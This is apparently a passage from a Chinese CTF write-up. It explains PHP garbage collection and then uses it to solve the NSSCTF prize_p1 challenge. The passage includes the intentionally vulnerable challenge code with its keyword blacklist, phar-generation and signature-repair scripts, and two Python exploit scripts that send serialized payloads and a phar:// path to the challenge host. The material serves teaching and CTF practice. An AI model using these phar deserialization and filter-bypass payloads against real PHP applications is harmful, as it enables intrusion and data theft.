<p>c: (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;array (0 &#x3D;&gt; (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;‘a’, 1 &#x3D;&gt; (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;‘b’)<br> c: (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;array (0 &#x3D;&gt; (refcount&#x3D;2, is_ref&#x3D;0)&#x3D;‘a’, 1  &#x3D;&gt; (refcount&#x3D;2, is_ref&#x3D;0)&#x3D;‘b’, 2 &#x3D;&gt; (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;‘c’)</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/22e913ea4a704047b26b0700fbfbafba.png" alt="1"></p>
<h3 id="回收周期"><a href="#回收周期" class="headerlink" title="回收周期"></a>回收周期</h3><p>php的垃圾回收机制是默认打开的，在php.ini中可以修改它<code>zend.enable_gc</code>，或者在运行php时分别调用gc_enable() 和 gc_disable()函数来打开和关闭垃圾回收机制。</p>
<p><img src="https://img-blog.csdnimg.cn/612b08fded7346268103c89b188ad14a.png" alt="请添加图片描述"></p>
<p>首先，需要确立一些基本规则。如果 refcount <strong>增加</strong>，则该变量仍在使用中，因此不是垃圾。如果 refcount    <strong>减少到 0</strong>，则 zval 可以释放。这意味着只有当引用计数参数减少到非零值时，才能创建垃圾循环。其次，在垃圾循环中，可以通过检查是否可以将 refcount 减少 1，并检查哪些    zval 的 refcount 为 0 来确定哪些部分是垃圾。</p>
<h2 id="GC机制的实际工作"><a href="#GC机制的实际工作" class="headerlink" title="GC机制的实际工作"></a>GC机制的实际工作</h2><p>那么GC回收机制在ctf中该怎么利用呢？上面说到PHP的魔术方法<code>__destruct()</code>函数在程序结束后会自动调用<code>__destruct()</code>函数进行自动销毁，但是程序报错或者异常终止就不会触发该函数。</p>
<p>一段代码：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">czy</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$test</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$test</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">test</span> <span class="token operator">=</span> <span class="token variable">$test</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">test</span><span class="token operator">.</span><span class="token string double-quoted-string">"我是__construct"</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">test</span><span class="token operator">.</span><span class="token string double-quoted-string">"我是__destruct"</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">new</span> <span class="token class-name">czy</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//直接new一个对象创建类，并没有进行指向</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">czy</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">czy</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//程序运行结束后会销毁所有对象，就会触发__destruct();</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://img-blog.csdnimg.cn/96d1a112806f4e149dede4669e5697b4.png" alt="请添加图片描述"></p>
<p>从运行的结果可以看到1就直接触发<code>__destrcut()函数</code>被当作垃圾给回收了。而1和2则是在创建完之后没有操作了才正常结束。</p>
<p>那么如果正常指向，然后后面再指向对象的时候忽然指向其他的，就是舍弃对象，那么又会发生什么呢？</p>
<p>一段代码：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">czy</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$test</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$test</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">test</span> <span class="token operator">=</span> <span class="token variable">$test</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">test</span><span class="token operator">.</span><span class="token string double-quoted-string">"我是__construct"</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">test</span><span class="token operator">.</span><span class="token string double-quoted-string">"我是__destruct"</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token variable">$c</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">czy</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$c</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$c</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//舍弃对象</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">czy</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">czy</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://img-blog.csdnimg.cn/10a042c5408c40bdb0b228566880b9f3.png" alt="请添加图片描述"><br> 对象czy被new了之后却被赋值为4，也就是new czy(1)执行是NULL，触发<code>__destruct()</code>当成垃圾被回收，也就成功执行了<code>__destruct()</code>里的语句，这是一个可用点。</p>
<p>如果我们注释掉<code>$c[0]=$c[1];//舍弃对象</code>：<br> <img src="https://img-blog.csdnimg.cn/f4192d1071814468b09e4daffcbf8377.png" alt="请添加图片描述"></p>
<p>拿着就是正常创建，正常销毁。</p>
<h2 id="结合题目"><a href="#结合题目" class="headerlink" title="结合题目"></a>结合题目</h2><p>这里我选了一个比较典型的题目<strong>NSSCTF prize_p1</strong><a target="_blank" rel="noopener" href="https://www.ctfer.vip/problem/14">题目地址</a></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>META</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Content-Type<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/html; charset=utf-8<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>

<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">getflag</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"FLAG"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">A</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$config</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">config</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'w'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/get|flag|post|php|filter|base64|rot13|read|data/i'</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"我知道你想干吗，我的建议是不要那样做。"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"./tmp/a.txt"</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">config</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'r'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/get|flag|post|php|filter|base64|rot13|read|data/i'</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"我知道你想干吗，我的建议是不要那样做。"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/get|flag|post|php|filter|base64|rot13|read|data/i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"我知道你想干吗，我的建议是不要那样做。"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"那么就从这里开始起航吧"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>flag在环境变量里。</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"那么就从这里开始起航吧"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//注意到这里扔出异常，那就想到今天讲的GC机制了。</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>在题目里也看到了</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"./tmp/a.txt"</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
以及
<span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/get|flag|post|php|filter|base64|rot13|read|data/i'</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span>
不免想到这里会使用phar协议
phar反序列化利用条件：
<span class="token operator">&lt;</span><span class="token number">1</span><span class="token operator">></span>有文件操作函数<span class="token punctuation">(</span>file_put_contents等等<span class="token punctuation">)</span>
<span class="token operator">&lt;</span><span class="token number">2</span><span class="token operator">></span>服务端有phar文件<span class="token punctuation">(</span>和后缀名无关，主要是格式。这里我们利用<span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token punctuation">)</span>函数来写入文件<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>大概思路就是先写入文件到&#x2F;tmp&#x2F;a.txt中，再利用<strong>phar协议</strong>解析&#x2F;tmp&#x2F;a.txt文件，触发<code>destruct()</code>获取环境变量中的flag。绕过<code>throw new Error()</code>的方法就是自己触发GC机制，提前进入<code>__destruct()</code>。</p>
<h3 id="phar"><a href="#phar" class="headerlink" title="phar"></a>phar</h3><p>要生成phar文件的话，必须在php.ini文件中将phar.readonly选项设置为Off，否则无法生成phar文件。(设置时注意把前面分号删掉)<br> <img src="https://img-blog.csdnimg.cn/c2c224439fdc4c3ea5931ff326460616.png" alt="请添加图片描述"></p>
<p>生成phar文件代码：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">getflag</span> <span class="token punctuation">&#123;</span>
<span class="token punctuation">&#125;</span>
 
<span class="token variable">$c</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">getflag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"123.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//后缀名必须为phar</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"xxx"</span><span class="token operator">.</span><span class="token string double-quoted-string">"xxx&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//设置stub</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//将自定义的meta-data存入manifest</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//添加要压缩的文件</span>
<span class="token comment">//签名自动计算</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>phar文件有四部分组成：</p>
<blockquote>
<ol>
<li>a stub</li>
</ol>
<p>stub的基本结构：**<code>xxx&lt;?php xxx;__HALT_COMPILER();?&gt;</code>，**前面内容不限，但必须以<code>__HALT_COMPILER();?&gt;</code>来结尾，否则phar扩展将无法识别这个文件为phar文件。</p>
<p>​	2.a manifest describing the contents</p>
<p>Phar文件中被压缩的文件的一些信息，其中Meta-data部分的信息会以序列化的形式储存(可控)，当通过phar:&#x2F;&#x2F;协议对phar文件进行文件操作时，将会对phar文件中的Meta-data进行反序列化操作这里就是漏洞利用的关键点。</p>
<p>​	3. the file contents 文件内容</p>
<p>被压缩的文件内容，在没有特殊要求的情况下，这个被压缩的文件内容可以随便写的，因为我们利用这个漏洞主要是为了触发它的反序列化。</p>
<p>​	4.signature 签名</p>
<p>注意phar文件不能任意修改，修改之后由于签名的存在，文件就会失效。</p>
</blockquote>
<p>查看生成的phar文件：</p>
<p>phar的反序列化标签格式&#x3D;变长字节散列函数值+4字节所使用散列函数标签名+4字节固定标签GBMB</p>
<p><img src="https://img-blog.csdnimg.cn/21937b33f24b4b75951b683dd0bfadb9.png" alt="请添加图片描述"></p>
<p>根据02 00 00 00可知是sha1计算签名<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/phar.fileformat.signature.php">文件链接</a><br> <img src="https://img-blog.csdnimg.cn/745c261c5195453fa2060be5ee60029e.png" alt="请添加图片描述"></p>
<p>好了，现在根据题目生成一个phar文件</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">getflag</span><span class="token punctuation">&#123;</span>

<span class="token punctuation">&#125;</span>

<span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">getflag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"czy.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                        <span class="token comment">//这里后缀必须为phar</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                             <span class="token comment">//开始写入内容</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;?php __HALT_COMPILER();?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token comment">//phar标识</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setmetadata</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token operator">=></span><span class="token variable">$a</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token operator">=></span><span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//上面数组中第一位是$a,第二位是null。序列化内容，这里内部相当于调用了serialize函数</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"czy.txt"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"czy"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                           <span class="token comment">//添加要一起加入phar归档的文件（文件名+内容）</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                              <span class="token comment">//停止写入，签名自动计算</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"成功生成phar文件"</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在这里注意，我们把这个类先赋给数组，再令赋值数组为NULL，它就会失去引用从而触发GC，达到绕过GC的目的。</p>
<p>ok，程序运行后会生成一个czy.phar文件。我们看它的metadata部分</p>
<p><img src="https://img-blog.csdnimg.cn/2771c6ad047944e2b91e0608e09d73b9.png" alt="请添加图片描述"></p>
<p>注意这0是将对象实例化的内容，由于getflag里面为空，也就显示了<code>&#123;&#125;i</code>，而这里的1就是null，此时如果我们把1强行改为0，那么就验证了上面的说法<code>令赋值数组为null</code>从而触发GC机制。但是也要注意，再将<code>0:&#123;&#125;i:1;N;</code>改为<code>0:&#123;&#125;i:0;N;</code>后，该文件需要对签名进行修复，phar文件用16进制编辑器打开后后28位的后四位是固定标识GBMB，21-24位代表的是sha1签名标识，而1-20位在这里就需要修改了。</p>
<p>借鉴一下脚本：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> hashlib <span class="token keyword">import</span> sha1 <span class="token comment">#sha1签名</span>
<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"czy.phar"</span><span class="token punctuation">,</span><span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
   text<span class="token operator">=</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   main<span class="token operator">=</span>text<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">28</span><span class="token punctuation">]</span>        <span class="token comment">#正文部分(除去最后28字节)</span>
   end<span class="token operator">=</span>text<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
   new_sign<span class="token operator">=</span>sha1<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span>
   new_phar<span class="token operator">=</span>main<span class="token operator">+</span>new_sign<span class="token operator">+</span>end
   <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"czy.phar"</span><span class="token punctuation">,</span><span class="token string">'wb'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>new_phar<span class="token punctuation">)</span>     <span class="token comment">#将新生成的内容以二进制方式覆盖写入原来的phar文件</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这里1-20位重新进行了sha1签名，修复好后，由于phar文件里还有getflag明文，如果要绕过正则的话，一个方法就是<strong>传数组</strong>来绕过正则，另一种办法就是将czy.phar再进行一次<strong>压缩</strong>，这样就不会出现getflag字样。</p>
<p>法一：</p>
<p>传数组</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> re

url<span class="token operator">=</span><span class="token string">"http://node4.anna.nssctf.cn:28513/"</span>

<span class="token comment">### 写入phar文件</span>
<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"czy.phar"</span><span class="token punctuation">,</span><span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
    data1<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'0[]'</span><span class="token punctuation">:</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>                                    <span class="token comment">#注意这里要传数组，来绕过waf</span>
    param1 <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">:</span> <span class="token string">'O:1:"A":1:&#123;s:6:"config";s:1:"w";&#125;'</span><span class="token punctuation">&#125;</span>
    p1 <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> params<span class="token operator">=</span>param1<span class="token punctuation">,</span>data<span class="token operator">=</span>data1<span class="token punctuation">)</span>
    <span class="token comment">#print(p1.text)</span>

<span class="token comment">### 读phar文件，触发反序列化</span>
param2<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token string">'O:1:"A":1:&#123;s:6:"config";s:1:"r";&#125;'</span><span class="token punctuation">&#125;</span>
data2<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token string">"phar://tmp/a.txt"</span><span class="token punctuation">&#125;</span>
p2<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>params<span class="token operator">=</span>param2<span class="token punctuation">,</span>data<span class="token operator">=</span>data2<span class="token punctuation">)</span>
p2<span class="token punctuation">.</span>encoding<span class="token operator">=</span><span class="token string">"utf-8"</span>
flag<span class="token operator">=</span>re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">'NSSCTF\&#123;.*?\&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>findall<span class="token punctuation">(</span>p2<span class="token punctuation">.</span>text<span class="token punctuation">)</span>  <span class="token comment">#用正则匹配匹配post包的response.text里的‘NSSCTF&#123;xxxxxx&#125;’</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>法二：</p>
<p>压缩czy.phar文件</p>
<p><img src="https://img-blog.csdnimg.cn/a43894200dcf4af8a31e75a1a9ad2ccf.png" alt="请添加图片描述"></p>
<p>之后</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">'http://node4.anna.nssctf.cn:28513/'</span>
requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>
    url<span class="token punctuation">,</span>
    params<span class="token operator">=</span><span class="token punctuation">&#123;</span>
        <span class="token number">0</span><span class="token punctuation">:</span> <span class="token string">'O:1:"A":1:&#123;s:6:"config";s:1:"w";&#125;'</span>

    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
    data<span class="token operator">=</span><span class="token punctuation">&#123;</span>
        <span class="token number">0</span><span class="token punctuation">:</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'czy.phar.gz'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">)</span>

res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>
    url<span class="token punctuation">,</span>
    params<span class="token operator">=</span><span class="token punctuation">&#123;</span>
        <span class="token number">0</span><span class="token punctuation">:</span> <span class="token string">'O:1:"A":1:&#123;s:6:"config";s:1:"r";&#125;'</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
    data<span class="token operator">=</span><span class="token punctuation">&#123;</span>
        <span class="token number">0</span><span class="token punctuation">:</span> <span class="token string">'phar://tmp/a.txt'</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">)</span>
res<span class="token punctuation">.</span>encoding <span class="token operator">=</span> <span class="token string">'utf-8'</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

